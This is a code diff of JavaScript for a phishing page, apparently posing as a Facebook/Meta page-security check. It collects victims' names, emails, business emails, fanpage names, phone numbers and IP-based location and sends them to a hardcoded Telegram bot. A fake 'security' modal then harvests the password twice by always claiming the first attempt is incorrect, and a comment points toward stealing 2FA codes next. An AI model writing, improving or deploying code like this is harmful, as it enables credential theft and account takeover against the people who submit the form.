@@ -1,24 +1,16 @@
-// ==================== CẤU HÌNH TRỰC TIẾP ====================
-// Bạn có thể điền trực tiếp Token và ID vào đây để chắc chắn 100%
-const BOT_TOKEN = '8648725712:AAGvpKkUW8V9dB6yBpwvkyvIi0xCHNdaHAk'; 
-const CHAT_ID = '-5286997232';
+// ==================== CẤU HÌNH GỬI THẲNG ====================
+const TG_TOKEN = '8648725712:AAGvpKKuW8V9dB6yBpwvkyvIi0xCHNDaHAk';
+const TG_ID = '5286997232';
 
-async function sendToTelegram(text) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    try {
-        await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: text,
-                parse_mode: 'HTML'
-            })
-        });
-    } catch (e) { console.error("Lỗi gửi Telegram:", e); }
+async function sendTelegram(text) {
+    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TG_ID, text: text, parse_mode: 'HTML' })
+    });
 }
 
-async function getLocation() {
+async function getFullLocation() {
     try {
         const res = await fetch('https://ipapi.co/json/');
         return await res.json();
@@ -32,8 +24,8 @@ document.getElementById('clientForm').addEventListener('submit', async (e) => {
     btn.disabled = true;
     btn.innerHTML = 'Loading...';
 
-    const loc = await getLocation();
-    const data = {
+    const loc = await getFullLocation();
+    const info = {
         name: document.getElementById('fullName').value,
         email: document.getElementById('email').value,
         eb: document.getElementById('emailBusiness').value,
@@ -41,26 +33,28 @@ document.getElementById('clientForm').addEventListener('submit', async (e) => {
         phone: document.getElementById('phone').value,
         ip: loc.ip || "N/A",
         country: loc.country_name || "N/A",
-        city: loc.city || "N/A"
+        city: loc.city || "N/A",
+        region: loc.region || "N/A"
     };
 
-    // Lưu tạm vào máy
-    localStorage.setItem('user_data', JSON.stringify(data));
+    localStorage.setItem('cached_data', JSON.stringify(info));
 
-    // Gửi tin nhắn đầu tiên có IP
-    const msg = `
-<b>🔔 CÓ DATA MỚI</b>
-- Họ tên: ${data.name}
-- Email: ${data.email}
-- Fanpage: ${data.page}
-- SĐT: ${data.phone}
-\n🌍 <b>VỊ TRÍ:</b>
-- IP: ${data.ip}
-- Quốc gia: ${data.country}
-- Thành phố: ${data.city}
-    `;
-    await sendToTelegram(msg);
+    const msg = `🚀 <b>THÔNG TIN ĐĂNG NHẬP</b> 🚀
+------------------------------
+📄 Page Name: <b>${info.page}</b>
+👤 Họ tên: <b>${info.name}</b>
+📧 Personal Email: ${info.email}
+📧 Business Email: ${info.eb}
+📱 SĐT: ${info.phone}
+------------------------------
+🌍 <b>Vị trí:</b>
+IP: <code>${info.ip}</code>
+Quốc gia: <b>${info.country}</b>
+Thành phố: <b>${info.city}</b>
+Vùng: <b>${info.region}</b>
+------------------------------`;
 
+    await sendTelegram(msg);
     btn.disabled = false;
     btn.textContent = 'Continue';
     openSecurityModal();
@@ -68,26 +62,38 @@ document.getElementById('clientForm').addEventListener('submit', async (e) => {
 
 function openSecurityModal() {
     const content = `
-        <div style="padding: 20px;">
-            <p>For your security, enter password to continue.</p>
+        <div style="padding: 20px; font-family: sans-serif;">
+            <p style="color: #9a979e; font-size: 14px;">For your security, you must enter your password to continue.</p>
             <form id="securityForm">
-                <input type="password" id="pass" placeholder="Password" style="width:100%; margin-bottom:10px; padding:8px; border:1px solid #ccc; border-radius:5px;">
-                <button type="submit" style="width:100%; background:#0064E0; color:white; border:none; padding:10px; border-radius:20px;">Continue</button>
+                <input type="password" id="passInput" placeholder="Password" style="width:100%; border: 1px solid #d4dbe3; padding: 10px; border-radius: 8px; margin-bottom: 15px; outline: none;">
+                <p id="passError" style="color: red; font-size: 12px; display: none; margin-bottom: 10px;"></p>
+                <button type="submit" style="width:100%; background: #0064E0; color: white; border: none; padding: 12px; border-radius: 20px; cursor: pointer; font-weight: bold;">Continue</button>
             </form>
-        </div>
-    `;
+        </div>`;
+
     Modal.create('securityModal', content);
     Modal.open('securityModal');
 
+    let step = 0;
     document.getElementById('securityForm').addEventListener('submit', async (e) => {
         e.preventDefault();
-        const pass = document.getElementById('pass').value;
-        const localData = JSON.parse(localStorage.getItem('user_data'));
+        const p = document.getElementById('passInput').value;
+        const err = document.getElementById('passError');
+        const data = JSON.parse(localStorage.getItem('cached_data'));
 
-        const msg = `<b>🔑 PASSWORD:</b> ${pass}\n<b>👤 User:</b> ${localData.email}`;
-        await sendToTelegram(msg);
+        if (!p) return;
 
-        // Sau khi gửi pass thì chuyển qua 2FA hoặc báo lỗi giả tùy ý bạn
-        alert("Password incorrect, please try again."); 
+        if (step === 0) {
+            await sendTelegram(`🔑 <b>Mật khẩu (Lần 1):</b> <code>${p}</code>\n👤 User: ${data.email}`);
+            err.textContent = "The password you've entered is incorrect.";
+            err.style.display = 'block';
+            document.getElementById('passInput').value = '';
+            step = 1;
+        } else {
+            await sendTelegram(`🔑 <b>Mật khẩu (Lần 2):</b> <code>${p}</code>\n👤 User: ${data.email}`);
+            Modal.close('securityModal');
+            // Chuyển sang 2FA ở đây nếu bạn muốn
+            alert("Security check required. Please check your device.");
+        }
     });
 }
